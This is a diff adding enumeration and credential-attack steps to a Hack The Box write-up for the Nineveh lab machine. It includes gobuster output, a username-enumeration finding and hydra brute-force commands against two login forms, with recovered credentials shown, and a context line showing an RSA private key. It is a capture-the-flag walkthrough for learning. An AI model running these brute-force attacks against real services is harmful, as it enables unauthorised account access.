@@ -37,6 +37,35 @@ Nmap done: 1 IP address (1 host up) scanned in 196.20 seconds
 The machine is running an Apache server on 80 and 443 (SSL) with a common name in the certificate of nineveh.htb.
 
 ### 2. Enumeration
+I can firstly visit the http site, which gives me the "it works" page for apache. Since the page made no attempt to apply SSL or redirect me to 443 I decide to enumerate http as well, starting with dirbusting from the root.
+```bash
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://nineveh.htb
+[+] Threads:        20
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/17 13:05:14 Starting gobuster
+===============================================================
+/department (Status: 301)
+===============================================================
+2020/12/17 13:31:36 Finished
+===============================================================
+```
+The /department directory has a login form that appears to be custom. I check for SQL injection and whilst doing so notice the errors given to the user whilst attempting to log in indicate valid usernames - if I enter "sdhafsd" as the username, I get told "invalid username", however if I try "admin" I only get "invalid password". With this in mind I can attempt an online attack of the password and see if it can be recovered.  
+Note: Later whilst setting up the wordlist attack I also notice there's a comment in the HTML:
+```html
+</div>
+
+<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
+
+        </div>
+```
 Browsing to the https site shows a cartoon image of two people in military clothing waving flags around. I can check the site certificate and see the email address given for it is admin@nineveh.htb.  
 Following that I attempt to dirbust the site and get a /db directory and /secure_notes.
 ```bash
@@ -163,4 +192,41 @@ fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
 -----END RSA PRIVATE KEY-----
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
 ```
-From here I backtrack to the phpLiteAdmin v1.9 page. Though the application has vulnerabilities such as LFI/RCE, it is all authenticated stuff. To authenticate I need to guess the password, which is made easier because there is no CSRF or limiting on the form.
+From here I backtrack to the phpLiteAdmin v1.9 page. Though the application has vulnerabilities such as LFI/RCE, it is all authenticated stuff. To authenticate I need to guess the password, which is made easier because there is no CSRF or limiting on the form. I therefore have two potential points of entry via the /department and phpLiteAdmin forms.
+
+### 3. Recover department password and login
+```bash
+─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-3hrv0spjom]─[~]
+└──╼ [★]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -t 32
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-17 13:21:40
+[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344398 login tries (l:1/p:14344398), ~448263 tries per task
+[DATA] attacking http-post-form://nineveh.htb:80/department/login.php:username=^USER^&password=^PASS^:Invalid Password!
+[STATUS] 1668.00 tries/min, 1668 tries in 00:01h, 14342730 to do in 143:19h, 32 active
+[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-17 13:24:25
+```
+The valid credentals for the department login form are `admin:1q2w3e4r5t`.  
+  
+Upon logging in, there is an "under construction" image, and then one other page - a notes page, which shows some notes relating to other stuff I've already looked at earlier.
+```
+Have you fixed the login page yet! hardcoded username and password is really bad idea!
+
+check your serect folder to get in! figure it out! this is your challenge
+
+Improve the db interface.
+~amrois
+```
+However I notice the notes page is getting the content from a parameter in the URL like so:
+```
+http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
+```
+This indicate a possible LFI vuln but I can't find any way to read files aside from the notes that is provided by the page. For now I'll move on with a plan to try and look at the source code for this app if I can get in through the phpLiteAdmin page.
+
+### 4. Recover phpLiteAdmin login cred
+```bash
+─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-3hrv0spjom]─[~/writeups/HackTheBox/HTB_Nineveh]
+└──╼ [★]$ hydra -l none -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^remember=yes&login=Log+In&proc_login=true:Incorrect password." -t 64
+```
